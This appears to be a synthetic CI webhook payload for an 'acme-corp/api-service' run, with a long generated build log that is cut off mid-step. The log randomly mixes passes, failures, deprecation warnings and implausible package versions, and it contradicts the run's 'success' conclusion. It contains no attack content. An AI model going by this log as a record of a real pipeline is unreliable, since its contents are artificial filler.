{
  "action": "completed",
  "workflow_run": {
    "id": 35,
    "name": "CI Pipeline",
    "head_branch": "feature/feat-538",
    "head_sha": "8404ed900fc82645cedd452c4f181d4f6df9cb9d",
    "status": "completed",
    "conclusion": "success",
    "run_started_at": "2025-12-03T12:00:18.050662Z",
    "updated_at": "2025-12-03T12:03:39.748824Z"
  },
  "repository": {
    "full_name": "acme-corp/api-service",
    "name": "api-service"
  },
  "sender": {
    "login": "grace"
  },
  "_safeops_extended": {
    "raw_logs": "=== Step: e2e_tests ===\nStep 10/10: Building\n[12:00:18] INFO: Processing request\n\u2713 test completed\n\u2717 build failed with exit code 80\n  PASS: test_cache_hit (224ms)\nCache hit for key-3194\n  PASS: test_auth_login (248ms)\nStep 8/10: Building\nException: TypeError\n  PASS: test_auth_login (131ms)\nCompiling src/utils.go...\nWARNING: axios has known vulnerabilities\nCompiling src/index.js...\n\u2713 build completed\n\u2713 build completed\n  PASS: test_auth_login (412ms)\nCompiling src/index.js...\nArtifact uploaded: build.tar.gz (22MB)\nInstalling webpack@1.16.0\nCache hit for key-2094\n\u2713 build completed\n  PASS: test_auth_login (370ms)\n  PASS: test_api_health (69ms)\n\u2717 build failed with exit code 95\n  PASS: test_api_health (130ms)\n[12:00:18] INFO: Processing request\nWARNING: react has known vulnerabilities\n[12:00:18] INFO: Processing request\n\u2713 build completed\nArtifact uploaded: build.tar.gz (49MB)\n  PASS: test_api_health (189ms)\nStep 10/10: Building\nStep 4/10: Building\n[12:00:18] INFO: Processing request\nInstalling axios@2.19.0\nStep 3/10: Building\nArtifact uploaded: build.tar.gz (13MB)\nCache hit for key-8928\n  PASS: test_user_create (285ms)\nCompiling src/handler.rs...\nCache hit for key-9608\n\u2717 build failed with exit code 95\nStep 6/10: Building\nStep 4/10: Building\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nArtifact uploaded: build.tar.gz (46MB)\n  PASS: test_user_create (96ms)\n[12:00:18] INFO: Processing request\nCompiling src/app.ts...\nCache hit for key-4593\nCompiling src/handler.rs...\nStep 8/10: Building\n  PASS: test_db_connect (70ms)\nStep 7/10: Building\n  PASS: test_auth_login (43ms)\nInstalling prettier@2.9.0\nInstalling prettier@1.20.0\nInstalling express@3.19.0\nCache hit for key-6930\nStep 9/10: Building\nStep 5/10: Building\nStep 8/10: Building\nInstalling express@4.19.0\nArtifact uploaded: build.tar.gz (33MB)\nStep 5/10: Building\n  PASS: test_cache_hit (483ms)\nWARNING: react has known vulnerabilities\nArtifact uploaded: build.tar.gz (10MB)\n  PASS: test_user_create (191ms)\nInstalling react@1.2.0\nWARNING: jest has known vulnerabilities\nArtifact uploaded: build.tar.gz (45MB)\n[12:00:18] WARN: Deprecated API usage\nInstalling prettier@1.18.0\n[12:00:18] INFO: Processing request\n[12:00:18] INFO: Processing request\nCompiling src/handler.rs...\n[12:00:18] INFO: Processing request\nInstalling lodash@5.2.0\nInstalling eslint@5.0.0\nArtifact uploaded: build.tar.gz (23MB)\n  PASS: test_db_connect (225ms)\nCompiling src/index.js...\n\u2713 build completed\n[12:00:18] INFO: Processing request\nCache hit for key-4163\n\u2713 build completed\n[12:00:18] WARN: Deprecated API usage\n\u2713 lint completed\nCompiling src/service.java...\n\u26a0 DEPRECATION: Feature will be removed in v2.0\n[12:00:18] WARN: Deprecated API usage\nStep 7/10: Building\nCompiling src/app.ts...\nCompiling src/service.java...\nArtifact uploaded: build.tar.gz (34MB)\n[12:00:18] INFO: Processing request\nInstalling prettier@5.0.0\nCompiling src/utils.go...\nArtifact uploaded: build.tar.gz (11MB)\nCompiling src/main.py...\n\u2713 lint completed\nCompiling src/handler.rs...\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nInstalling webpack@3.17.0\nStep 7/10: Building\nInstalling react@1.18.0\nArtifact uploaded: build.tar.gz (26MB)\nArtifact uploaded: build.tar.gz (20MB)\nCompiling src/utils.go...\nCache hit for key-4300\n\u2713 lint completed\n  PASS: test_user_create (407ms)\nCache hit for key-8238\nCache hit for key-2125\n\u2713 build completed\nCompiling src/main.py...\nInstalling eslint@3.5.0\n=== Step e2e_tests completed ===\n=== Step: deploy_staging ===\n\u2713 lint completed\nInstalling webpack@5.12.0\n\u2713 build completed\n\u2713 test completed\nInstalling jest@1.8.0\nCache hit for key-4243\n[12:00:18] INFO: Processing request\nInstalling webpack@4.11.0\nCompiling src/handler.rs...\n\u2713 lint completed\nCompiling src/utils.go...\nCache hit for key-5602\nStep 3/10: Building\nCompiling src/main.py...\nInstalling lodash@2.12.0\nInstalling lodash@1.6.0\n[12:00:18] INFO: Processing request\nArtifact uploaded: build.tar.gz (15MB)\n[12:00:18] ERROR: Connection failed\n\u2713 build completed\nArtifact uploaded: build.tar.gz (42MB)\nArtifact uploaded: build.tar.gz (32MB)\nStep 6/10: Building\nInstalling webpack@3.15.0\nArtifact uploaded: build.tar.gz (49MB)\n  PASS: test_api_health (308ms)\nCache hit for key-9764\nInstalling lodash@3.16.0\n\u2717 build failed with exit code 98\n[12:00:18] INFO: Processing request\nArtifact uploaded: build.tar.gz (30MB)\n  PASS: test_user_create (173ms)\nStep 5/10: Building\n\u2713 build completed\nArtifact uploaded: build.tar.gz (18MB)\n  PASS: test_cache_hit (279ms)\nWARNING: prettier has known vulnerabilities\nCompiling src/index.js...\nWARNING: jest has known vulnerabilities\n[12:00:18] WARN: Deprecated API usage\n  PASS: test_cache_hit (461ms)\n[12:00:18] INFO: Processing request\nArtifact uploaded: build.tar.gz (21MB)\nCompiling src/app.ts...\n\u2713 lint completed\nArtifact uploaded: build.tar.gz (7MB)\nArtifact uploaded: build.tar.gz (2MB)\n  PASS: test_auth_login (274ms)\nArtifact uploaded: build.tar.gz (39MB)\nInstalling eslint@4.16.0\nCompiling src/main.py...\nCompiling src/index.js...\nStep 8/10: Building\n  PASS: test_auth_login (11ms)\n\u2713 test completed\nException: TypeError\nArtifact uploaded: build.tar.gz (16MB)\nCompiling src/utils.go...\n  PASS: test_api_health (374ms)\nCache hit for key-9373\n[12:00:18] WARN: Deprecated API usage\n  PASS: test_user_create (440ms)\nWARNING: jest has known vulnerabilities\nStep 8/10: Building\nCompiling src/handler.rs...\nStep 1/10: Building\nInstalling react@1.10.0\nCache hit for key-1899\nArtifact uploaded: build.tar.gz (20MB)\nCompiling src/index.js...\nCompiling src/handler.rs...\nInstalling lodash@1.2.0\nStep 9/10: Building\n  PASS: test_user_create (251ms)\nStep 10/10: Building\nCompiling src/index.js...\n\u2713 test completed\n[12:00:18] WARN: Deprecated API usage\n\u2713 lint completed\nStep 6/10: Building\n\u2713 build completed\n  PASS: test_api_health (150ms)\nCache hit for key-8960\nCompiling src/handler.rs...\n[12:00:18] INFO: Processing request\nWARNING: react has known vulnerabilities\n\u2713 build completed\n  PASS: test_db_connect (55ms)\nStep 1/10: Building\n  PASS: test_auth_login (246ms)\nCache hit for key-4290\n[12:00:18] WARN: Deprecated API usage\n\u26a0 DEPRECATION: Feature will be removed in v4.0\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nCache hit for key-8058\nCache hit for key-4108\nInstalling jest@1.15.0\nStep 5/10: Building\nCompiling src/service.java...\nCache hit for key-7957\nException: TypeError\n[12:00:18] INFO: Processing request\nStep 1/10: Building\nInstalling express@2.6.0\nInstalling jest@5.6.0\n  PASS: test_db_connect (227ms)\n[12:00:18] INFO: Processing request\nCache hit for key-1767\nInstalling prettier@3.17.0\nStep 7/10: Building\nCompiling src/app.ts...\n\u2717 build failed with exit code 8\nArtifact uploaded: build.tar.gz (34MB)\n[12:00:18] INFO: Processing request\nInstalling webpack@1.20.0\nInstalling jest@4.8.0\nStep 8/10: Building\nException: ValueError\n=== Step deploy_staging completed ===\n=== Step: lint ===\nCompiling src/app.ts...\n\u2713 build completed\nStep 1/10: Building\nStep 8/10: Building\n[12:00:18] INFO: Processing request\nCompiling src/utils.go...\n  PASS: test_api_health (183ms)\n\u2713 lint completed\n\u2713 build completed\nStep 4/10: Building\n  PASS: test_cache_hit (378ms)\n  PASS: test_auth_login (189ms)\n[12:00:18] INFO: Processing request\nArtifact uploaded: build.tar.gz (48MB)\nStep 9/10: Building\nFAILED: test_api_health\n[12:00:18] WARN: Deprecated API usage\n\u2713 test completed\n[12:00:18] INFO: Processing request\nStep 10/10: Building\n  PASS: test_user_create (447ms)\nArtifact uploaded: build.tar.gz (6MB)\nStep 3/10: Building\n[12:00:18] INFO: Processing request\nCache hit for key-1031\n\u2717 build failed with exit code 57\nArtifact uploaded: build.tar.gz (2MB)\n  PASS: test_cache_hit (200ms)\n  PASS: test_db_connect (210ms)\n\u2713 test completed\nStep 4/10: Building\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nInstalling lodash@1.15.0\nInstalling prettier@4.4.0\nArtifact uploaded: build.tar.gz (30MB)\nStep 2/10: Building\n[12:00:18] INFO: Processing request\n[12:00:18] WARN: Deprecated API usage\nArtifact uploaded: build.tar.gz (42MB)\nArtifact uploaded: build.tar.gz (25MB)\nCompiling src/main.py...\n  PASS: test_auth_login (289ms)\nInstalling prettier@3.5.0\nCompiling src/index.js...\n\u2713 lint completed\nWARNING: prettier has known vulnerabilities\nInstalling lodash@1.15.0\nArtifact uploaded: build.tar.gz (2MB)\n\u2713 test completed\nStep 1/10: Building\nCompiling src/utils.go...\n  PASS: test_cache_hit (211ms)\nCache hit for key-4233\nStep 9/10: Building\n\u2713 lint completed\nArtifact uploaded: build.tar.gz (2MB)\n\u26a0 DEPRECATION: Feature will be removed in v4.0\n\u2713 test completed\nCompiling src/handler.rs...\nInstalling jest@4.14.0\n  PASS: test_user_create (452ms)\n  PASS: test_cache_hit (482ms)\n\u2713 build completed\n\u2713 lint completed\nCompiling src/main.py...\nCompiling src/utils.go...\nStep 3/10: Building\nException: TypeError\nStep 10/10: Building\nInstalling webpack@5.9.0\n\u2713 build completed\nWARNING: lodash has known vulnerabilities\n[12:00:18] INFO: Processing request\nCache hit for key-5552\n[12:00:18] INFO: Processing request\nInstalling express@5.17.0\nWARNING: lodash has known vulnerabilities\nCompiling src/main.py...\nCompiling src/index.js...\nArtifact uploaded: build.tar.gz (17MB)\nCompiling src/handler.rs...\n[12:00:18] WARN: Deprecated API usage\nCompiling src/utils.go...\n[12:00:18] INFO: Processing request\nStep 5/10: Building\nArtifact uploaded: build.tar.gz (45MB)\nCache hit for key-4277\nInstalling react@5.9.0\nCache hit for key-4049\nCompiling src/index.js...\nInstalling lodash@2.10.0\nStep 7/10: Building\nException: TypeError\nArtifact uploaded: build.tar.gz (6MB)\n  PASS: test_auth_login (395ms)\n  PASS: test_user_create (359ms)\n[12:00:18] INFO: Processing request\nCompiling src/service.java...\nInstalling axios@2.6.0\n[12:00:18] INFO: Processing request\nInstalling webpack@5.20.0\nArtifact uploaded: build.tar.gz (47MB)\nArtifact uploaded: build.tar.gz (25MB)\nFAILED: test_user_create\n[12:00:18] INFO: Processing request\nFAILED: test_auth_login\nCompiling src/utils.go...\n[12:00:18] INFO: Processing request\nInstalling prettier@2.10.0\nArtifact uploaded: build.tar.gz (28MB)\nCompiling src/index.js...\nArtifact uploaded: build.tar.gz (42MB)\n  PASS: test_auth_login (420ms)\nCompiling src/index.js...\nCompiling src/service.java...\nArtifact uploaded: build.tar.gz (15MB)\nCache hit for key-2934\nArtifact uploaded: build.tar.gz (33MB)\n=== Step lint completed ===\n=== Step: setup_environment ===\nArtifact uploaded: build.tar.gz (24MB)\n\u2713 test completed\n\u2713 lint completed\nStep 6/10: Building\nCompiling src/service.java...\nArtifact uploaded: build.tar.gz (21MB)\nInstalling eslint@4.12.0\n\u2713 lint completed\n[12:00:18] INFO: Processing request\nCompiling src/app.ts...\nInstalling eslint@5.2.0\n[12:00:18] WARN: Deprecated API usage\nInstalling lodash@4.20.0\n\u2717 build failed with exit code 14\nStep 5/10: Building\n\u2717 build failed with exit code 93\nCache hit for key-4031\nCache hit for key-8038\nCache hit for key-1749\nArtifact uploaded: build.tar.gz (45MB)\n\u2713 build completed\nStep 8/10: Building\nCompiling src/app.ts...\nArtifact uploaded: build.tar.gz (21MB)\n  PASS: test_cache_hit (288ms)\nArtifact uploaded: build.tar.gz (33MB)\nCompiling src/app.ts...\nCache hit for key-6082\nArtifact uploaded: build.tar.gz (7MB)\nCompiling src/app.ts...\n[12:00:18] INFO: Processing request\n  PASS: test_cache_hit (391ms)\nStep 4/10: Building\nCache hit for key-3067\n  PASS: test_auth_login (381ms)\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n[12:00:18] ERROR: Connection failed\nCompiling src/main.py...\nCompiling src/handler.rs...\nArtifact uploaded: build.tar.gz (42MB)\n\u2713 build completed\nStep 4/10: Building\nCache hit for key-7042\nStep 6/10: Building\nCache hit for key-1225\n[12:00:18] INFO: Processing request\nCache hit for key-9855\nCompiling src/service.java...\n[12:00:18] WARN: Deprecated API usage\nCache hit for key-7680\nStep 7/10: Building\nInstalling express@2.11.0\nCompiling src/app.ts...\nWARNING: react has known vulnerabilities\n[12:00:18] INFO: Processing request\nInstalling jest@4.17.0\nInstalling webpack@1.0.0\nArtifact uploaded: build.tar.gz (48MB)\nCompiling src/utils.go...\nInstalling axios@1.17.0\nInstalling react@4.15.0\nCompiling src/main.py...\nArtifact uploaded: build.tar.gz (8MB)\nCache hit for key-9161\nCompiling src/utils.go...\n[12:00:18] INFO: Processing request\nCompiling src/app.ts...\n[12:00:18] INFO: Processing request\nCache hit for key-5503\n\u2713 lint completed\n  PASS: test_db_connect (275ms)\nArtifact uploaded: build.tar.gz (4MB)\nArtifact uploaded: build.tar.gz (15MB)\nArtifact uploaded: build.tar.gz (1MB)\nStep 10/10: Building\nCompiling src/main.py...\nWARNING: eslint has known vulnerabilities\n[12:00:18] INFO: Processing request\n  PASS: test_cache_hit (225ms)\n  PASS: test_db_connect (279ms)\n  PASS: test_cache_hit (146ms)\nInstalling webpack@2.4.0\nInstalling prettier@4.16.0\nArtifact uploaded: build.tar.gz (9MB)\n  PASS: test_cache_hit (262ms)\n[12:00:18] INFO: Processing request\nInstalling webpack@1.11.0\nInstalling express@4.15.0\nInstalling axios@1.17.0\nStep 3/10: Building\nArtifact uploaded: build.tar.gz (44MB)\nStep 5/10: Building\nWARNING: eslint has known vulnerabilities\nStep 2/10: Building\n[12:00:18] INFO: Processing request\n  PASS: test_auth_login (318ms)\n[12:00:18] INFO: Processing request\nArtifact uploaded: build.tar.gz (5MB)\nInstalling eslint@4.0.0\nCache hit for key-7308\n\u2713 build completed\nArtifact uploaded: build.tar.gz (24MB)\nCache hit for key-6507\nStep 6/10: Building\n[12:00:18] WARN: Deprecated API usage\nStep 5/10: Building\nStep 4/10: Building\n\u2713 lint completed\n  PASS: test_user_create (341ms)\n\u2713 build completed\nStep 6/10: Building\nCompiling src/index.js...\nCompiling src/app.ts...\n\u2713 build completed\n  PASS: test_cache_hit (347ms)\nCompiling src/index.js...\nWARNING: lodash has known vulnerabilities\nCompiling src/index.js...\n=== Step setup_environment completed ===\n=== Step: type_check ===\n[12:00:18] INFO: Processing request\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n  PASS: test_api_health (267ms)\n[12:00:18] WARN: Deprecated API usage\n\u2713 test completed\nCache hit for key-3182\n[12:00:18] INFO: Processing request\nStep 3/10: Building\nCache hit for key-6105\nCache hit for key-2231\n[12:00:18] WARN: Deprecated API usage\nCompiling src/app.ts...\nCompiling src/main.py...\n[12:00:18] INFO: Processing request\n[12:00:18] INFO: Processing request\nInstalling axios@2.17.0\nStep 7/10: Building\n  PASS: test_db_connect (107ms)\nArtifact uploaded: build.tar.gz (2MB)\n  PASS: test_db_connect (428ms)\nInstalling eslint@1.3.0\nCache hit for key-4191\nCompiling src/app.ts...\nInstalling eslint@2.7.0\n[12:00:18] ERROR: Connection failed\n[12:00:18] INFO: Processing request\n  PASS: test_auth_login (267ms)\n\u2713 lint completed\n  PASS: test_api_health (394ms)\n\u2713 build completed\nStep 2/10: Building\n  PASS: test_db_connect (349ms)\nStep 8/10: Building\n\u2713 test completed\n[12:00:18] INFO: Processing request\n  PASS: test_cache_hit (225ms)\nInstalling webpack@4.0.0\n[12:00:18] INFO: Processing request\nStep 8/10: Building\nArtifact uploaded: build.tar.gz (50MB)\n\u2713 test completed\nInstalling prettier@4.1.0\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nInstalling webpack@4.1.0\nInstalling webpack@2.18.0\nCompiling src/app.ts...\nArtifact uploaded: build.tar.gz (38MB)\nInstalling jest@4.7.0\nFAILED: test_api_health\nStep 8/10: Building\nWARNING: jest has known vulnerabilities\n\u2713 test completed\nInstalling jest@3.13.0\nArtifact uploaded: build.tar.gz (4MB)\nStep 3/10: Building\n  PASS: test_user_create (272ms)\nCompiling src/app.ts...\nArtifact uploaded: build.tar.gz (20MB)\nStep 10/10: Building\n[12:00:18] INFO: Processing request\nInstalling react@1.3.0\n\u2713 lint completed\nStep 6/10: Building\n[12:00:18] INFO: Processing request\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nCompiling src/utils.go...\nCompiling src/service.java...\nCompiling src/service.java...\n  PASS: test_user_create (54ms)\n[12:00:18] WARN: Deprecated API usage\n\u2713 build completed\nCache hit for key-6480\nArtifact uploaded: build.tar.gz (27MB)\nStep 3/10: Building\nArtifact uploaded: build.tar.gz (14MB)\nCache hit for key-5910\nStep 4/10: Building\n  PASS: test_db_connect (237ms)\nInstalling eslint@4.2.0\n  PASS: test_auth_login (1ms)\nArtifact uploaded: build.tar.gz (28MB)\nCache hit for key-1756\n\u2713 build completed\nStep 9/10: Building\nArtifact uploaded: build.tar.gz (17MB)\n[12:00:18] INFO: Processing request\n  PASS: test_db_connect (301ms)\n[12:00:18] INFO: Processing request\n[12:00:18] INFO: Processing request\n  PASS: test_db_connect (197ms)\n[12:00:18] INFO: Processing request\nWARNING: prettier has known vulnerabilities\nCache hit for key-8454\nInstalling react@4.18.0\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nArtifact uploaded: build.tar.gz (24MB)\nCompiling src/handler.rs...\nArtifact uploaded: build.tar.gz (31MB)\nCache hit for key-5209\n  PASS: test_db_connect (291ms)\n\u2713 test completed\nCache hit for key-7264\nStep 2/10: Building\n\u2713 lint completed\n[12:00:18] INFO: Processing request\nArtifact uploaded: build.tar.gz (43MB)\n\u2713 build completed\n[12:00:18] INFO: Processing request\n  PASS: test_cache_hit (164ms)\nCache hit for key-7525\n\u2713 lint completed\nArtifact uploaded: build.tar.gz (46MB)\nCache hit for key-8528\nArtifact uploaded: build.tar.gz (4MB)\n\u2713 test completed\nStep 5/10: Building\nCompiling src/main.py...\nWARNING: react has known vulnerabilities\n=== Step type_check completed ===\n=== Step: install_dependencies ===\nWARNING: eslint has known vulnerabilities\nStep 10/10: Building\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nException: ValueError\n\u2713 lint completed\n[12:00:18] INFO: Processing request\nStep 9/10: Building\n  PASS: test_user_create (437ms)\nInstalling react@5.20.0\n\u2713 build completed\n  PASS: test_user_create (375ms)\n[12:00:18] INFO: Processing request\nCache hit for key-9626\nFAILED: test_user_create\n  PASS: test_cache_hit (251ms)\nStep 1/10: Building\nArtifact uploaded: build.tar.gz (3MB)\nCache hit for key-3564\n[12:00:18] INFO: Processing request\n\u2713 build completed\nCache hit for key-6865\nCache hit for key-7938\n\u2713 test completed\nArtifact uploaded: build.tar.gz (4MB)\nArtifact uploaded: build.tar.gz (26MB)\nCache hit for key-2380\nCache hit for key-7908\nArtifact uploaded: build.tar.gz (46MB)\n[12:00:18] INFO: Processing request\n[12:00:18] INFO: Processing request\n[12:00:18] INFO: Processing request\nStep 1/10: Building\nCache hit for key-3682\n  PASS: test_db_connect (132ms)\n[12:00:18] INFO: Processing request\nCache hit for key-1410\nCompiling src/main.py...\nCache hit for key-2016\nCache hit for key-4418\nWARNING: prettier has known vulnerabilities\nWARNING: express has known vulnerabilities\nCache hit for key-3214\n\u2713 test completed\n\u2713 lint completed\nCompiling src/utils.go...\nArtifact uploaded: build.tar.gz (30MB)\n[12:00:18] INFO: Processing request\n  PASS: test_auth_login (120ms)\nCache hit for key-8400\nCache hit for key-7628\n\u2713 build completed\n\u2713 test completed\n\u26a0 DEPRECATION: Feature will be removed in v5.0\n  PASS: test_user_create (154ms)\n  PASS: test_db_connect (158ms)\nStep 7/10: Building\n[12:00:18] INFO: Processing request\n  PASS: test_user_create (65ms)\nArtifact uploaded: build.tar.gz (14MB)\nInstalling eslint@5.10.0\n  PASS: test_cache_hit (459ms)\n\u26a0 DEPRECATION: Feature will be removed in v2.0\n[12:00:18] INFO: Processing request\nArtifact uploaded: build.tar.gz (2MB)\n[12:00:18] INFO: Processing request\nArtifact uploaded: build.tar.gz (8MB)\n[12:00:18] INFO: Processing request\nStep 5/10: Building\nArtifact uploaded: build.tar.gz (3MB)\nFAILED: test_cache_hit\nArtifact uploaded: build.tar.gz (26MB)\n  PASS: test_user_create (415ms)\nInstalling react@4.6.0\nInstalling lodash@1.8.0\nInstalling jest@3.12.0\n[12:00:18] INFO: Processing request\nStep 7/10: Building\nCompiling src/service.java...\nCache hit for key-8476\nCompiling src/service.java...\n[12:00:18] INFO: Processing request\n\u2713 lint completed\n\u2713 build completed\n\u2713 test completed\nCompiling src/utils.go...\n  PASS: test_api_health (231ms)\n  PASS: test_api_health (298ms)\nInstalling lodash@1.7.0\nCompiling src/handler.rs...\nCache hit for key-3713\nException: TypeError\n  PASS: test_api_health (432ms)\nFAILED: test_auth_login\nCompiling src/utils.go...\nCompiling src/handler.rs...\n[12:00:18] INFO: Processing request\n  PASS: test_db_connect (319ms)\nCompiling src/index.js...\nInstalling react@2.5.0\nCache hit for key-7077\n  PASS: test_cache_hit (420ms)\nStep 3/10: Building\nCache hit for key-8185\nCompiling src/handler.rs...\nArtifact uploaded: build.tar.gz (11MB)\nCompiling src/app.ts...\nWARNING: prettier has known vulnerabilities\n[12:00:18] INFO: Processing request\nStep 6/10: Building\n  PASS: test_cache_hit (425ms)\nCache hit for key-6847\nInstalling jest@1.10.0\nInstalling prettier@5.16.0\n  PASS: test_cache_hit (213ms)\nCompiling src/app.ts...\nArtifact uploaded: build.tar.gz (37MB)\nCache hit for key-3666\n[12:00:18] ERROR: Connection failed\n=== Step install_dependencies completed ===\n=== Step: integration_tests ===\n[12:00:18] INFO: Processing request\nInstalling express@4.14.0\nWARNING: express has known vulnerabilities\n[12:00:18] INFO: Processing request\nWARNING: express has known vulnerabilities\n[12:00:18] INFO: Processing request\nWARNING: express has known vulnerabilities\n[12:00:18] INFO: Processing request\nStep 7/10: Building\nInstalling prettier@3.18.0\nStep 3/10: Building\nStep 5/10: Building\nArtifact uploaded: build.tar.gz (14MB)\nArtifact uploaded: build.tar.gz (33MB)\nFAILED: test_user_create\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nStep 10/10: Building\nCache hit for key-4193\n  PASS: test_auth_login (472ms)\n[12:00:18] INFO: Processing request\n\u2717 build failed with exit code 113\n  PASS: test_auth_login (96ms)\n[12:00:18] INFO: Processing request\n\u2713 lint completed\nCache hit for key-3692\nArtifact uploaded: build.tar.gz (40MB)\n\u2713 build completed\n[12:00:18] INFO: Processing request\n  PASS: test_user_create (5ms)\n\u2713 build completed\nStep 2/10: Building\n  PASS: test_user_create (469ms)\n\u2717 build failed with exit code 124\nCompiling src/service.java...\n  PASS: test_auth_login (339ms)\n\u2713 build completed\nCompiling src/handler.rs...\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nStep 7/10: Building\n[12:00:18] INFO: Processing request\nCompiling src/service.java...\nArtifact uploaded: build.tar.gz (11MB)\n[12:00:18] INFO: Processing request\nCache hit for key-4389\nArtifact uploaded: build.tar.gz (20MB)\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nCache hit for key-1954\n[12:00:18] WARN: Deprecated API usage\nArtifact uploaded: build.tar.gz (41MB)\nArtifact uploaded: build.tar.gz (10MB)\nFAILED: test_db_connect\nCache hit for key-5907\n\u2713 test completed\n\u2713 build completed\n\u2713 lint completed\nCompiling src/utils.go...\nFAILED: test_user_create\nArtifact uploaded: build.tar.gz (21MB)\nStep 6/10: Building\nInstalling jest@3.2.0\n[12:00:18] INFO: Processing request\nInstalling jest@2.0.0\n  PASS: test_user_create (469ms)\nStep 1/10: Building\n\u2713 build completed\n[12:00:18] INFO: Processing request\nInstalling lodash@4.15.0\n  PASS: test_api_health (311ms)\nCompiling src/utils.go...\nArtifact uploaded: build.tar.gz (9MB)\nStep 2/10: Building\nInstalling webpack@1.20.0\nWARNING: webpack has known vulnerabilities\nCache hit for key-7480\nStep 10/10: Building\n  PASS: test_user_create (398ms)\nCompiling src/handler.rs...\nStep 2/10: Building\nStep 9/10: Building\nArtifact uploaded: build.tar.gz (14MB)\n  PASS: test_db_connect (375ms)\n  PASS: test_cache_hit (182ms)\n\u2713 lint completed\n[12:00:18] INFO: Processing request\nCompiling src/index.js...\n[12:00:18] WARN: Deprecated API usage\nCompiling src/app.ts...\n  PASS: test_user_create (106ms)\n  PASS: test_api_health (41ms)\nCache hit for key-5387\nArtifact uploaded: build.tar.gz (22MB)\nStep 10/10: Building\nInstalling react@1.16.0\n[12:00:18] ERROR: Connection failed\nStep 7/10: Building\n[12:00:18] ERROR: Connection failed\n\u2713 lint completed\nFAILED: test_auth_login\nStep 6/10: Building\n\u2717 build failed with exit code 19\n[12:00:18] INFO: Processing request\n[12:00:18] INFO: Processing request\nStep 7/10: Building\nCache hit for key-3051\n  PASS: test_user_create (228ms)\nStep 9/10: Building\n[12:00:18] INFO: Processing request\nInstalling react@1.11.0\nStep 8/10: Building\n\u2713 test completed\nCache hit for key-2936\nStep 10/10: Building\nCache hit for key-5779\n[12:00:18] INFO: Processing request\nCache hit for key-2451\nCache hit for key-2482\nCache hit for key-4617\nArtifact uploaded: build.tar.gz (4MB)\n=== Step integration_tests completed ===\n=== Step: deploy_production ===\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nStep 3/10: Building\n\u2713 test completed\nCompiling src/handler.rs...\nCache hit for key-1356\n  PASS: test_user_create (33ms)\nInstalling eslint@3.4.0\nCache hit for key-7209\nCompiling src/app.ts...\nStep 4/10: Building\n[12:00:18] WARN: Deprecated API usage\nException: RuntimeError\nStep 9/10: Building\n[12:00:18] WARN: Deprecated API usage\nStep 6/10: Building\n  PASS: test_cache_hit (300ms)\nCompiling src/app.ts...\nCache hit for key-1373\nCompiling src/main.py...\nStep 7/10: Building\n[12:00:18] INFO: Processing request\nStep 8/10: Building\nCache hit for key-9422\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nCache hit for key-2503\n[12:00:18] INFO: Processing request\n[12:00:18] INFO: Processing request\n[12:00:18] INFO: Processing request\nCompiling src/main.py...\nCache hit for key-5923\nStep 5/10: Building\nCompiling src/index.js...\n\u2713 lint completed\n[12:00:18] INFO: Processing request\nArtifact uploaded: build.tar.gz (49MB)\n[12:00:18] INFO: Processing request\nCache hit for key-9592\nCompiling src/handler.rs...\n[12:00:18] INFO: Processing request\nCache hit for key-1312\n[12:00:18] INFO: Processing request\n\u2713 test completed\nStep 7/10: Building\n\u26a0 DEPRECATION: Feature will be removed in v4.0\n[12:00:18] WARN: Deprecated API usage\n[12:00:18] INFO: Processing request\nInstalling jest@1.4.0\nCache hit for key-3162\n[12:00:18] WARN: Deprecated API usage\nCache hit for key-5113\n  PASS: test_user_create (473ms)\nInstalling jest@1.19.0\nInstalling express@1.15.0\n\u2713 build completed\nCache hit for key-4166\nArtifact uploaded: build.tar.gz (46MB)\n  PASS: test_auth_login (65ms)\n\u2713 lint completed\n  PASS: test_db_connect (330ms)\n[12:00:18] INFO: Processing request\n[12:00:18] INFO: Processing request\nArtifact uploaded: build.tar.gz (7MB)\n\u2717 build failed with exit code 49\nInstalling jest@5.1.0\nStep 10/10: Building\n  PASS: test_db_connect (86ms)\nCache hit for key-9190\nInstalling lodash@1.4.0\n  PASS: test_cache_hit (261ms)\n\u2713 lint completed\nArtifact uploaded: build.tar.gz (37MB)\nCache hit for key-6548\nArtifact uploaded: build.tar.gz (45MB)\nFAILED: test_api_health\nArtifact uploaded: build.tar.gz (50MB)\nStep 7/10: Building\nStep 5/10: Building\nArtifact uploaded: build.tar.gz (45MB)\n\u2713 lint completed\nArtifact uploaded: build.tar.gz (28MB)\nStep 2/10: Building\n  PASS: test_db_connect (166ms)\nStep 7/10: Building\n  PASS: test_auth_login (189ms)\n[12:00:18] INFO: Processing request\nCompiling src/app.ts...\nCache hit for key-5190\nCompiling src/main.py...\nWARNING: lodash has known vulnerabilities\nCache hit for key-5483\nInstalling webpack@4.4.0\nInstalling express@3.17.0\n  PASS: test_cache_hit (109ms)\n[12:00:18] INFO: Processing request\nInstalling eslint@3.13.0\n[12:00:18] WARN: Deprecated API usage\n[12:00:18] INFO: Processing request\nInstalling jest@3.12.0\nWARNING: webpack has known vulnerabilities\n[12:00:18] INFO: Processing request\nStep 8/10: Building\nCompiling src/service.java...\nInstalling eslint@3.8.0\nStep 4/10: Building\n\u2713 test completed\nInstalling express@2.7.0\nCompiling src/handler.rs...\nStep 9/10: Building\nCompiling src/app.ts...\nCache hit for key-4278\nFAILED: test_api_health\nCompiling src/handler.rs...\nCache hit for key-5471\nCache hit for key-2002\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nCompiling src/handler.rs...\nCache hit for key-5070\n[12:00:18] INFO: Processing request\n=== Step deploy_production completed ===\n=== Step: unit_tests ===\nInstalling webpack@4.8.0\nArtifact uploaded: build.tar.gz (15MB)\nArtifact uploaded: build.tar.gz (38MB)\nStep 3/10: Building\nStep 10/10: Building\nCache hit for key-3934\n[12:00:18] INFO: Processing request\nInstalling prettier@1.4.0\n  PASS: test_db_connect 